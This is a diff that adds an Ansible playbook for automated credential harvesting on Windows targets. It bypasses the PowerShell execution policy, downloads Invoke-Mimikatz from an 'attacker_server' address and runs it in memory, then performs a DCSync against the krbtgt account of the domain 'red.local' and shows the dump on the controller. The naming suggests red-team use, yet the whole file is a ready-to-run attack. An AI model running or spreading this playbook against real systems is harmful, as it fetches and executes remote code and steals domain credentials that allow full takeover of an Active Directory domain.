@@ -1,0 +1,19 @@
+- name: Automate Credential Harvesting with Invoke-Mimikatz via Ansible
+  hosts: windows_targets
+  gather_facts: no
+  vars:
+    attacker_server: "http://192.168.10.50:8000"
+    target_domain: "red.local"
+    target_user: "krbtgt"
+
+  tasks:
+    - name: Execute Invoke-Mimikatz in memory and perform DCSync
+      win_shell: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        IEX (New-Object Net.WebClient).DownloadString('{{ attacker_server }}/Invoke-Mimikatz.ps1')
+        Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{{ target_domain }} /user:{{ target_user }}"'
+      register: mimikatz_result
+
+    - name: Display harvested output on the controller
+      debug:
+        msg: "{{ mimikatz_result.stdout }}"
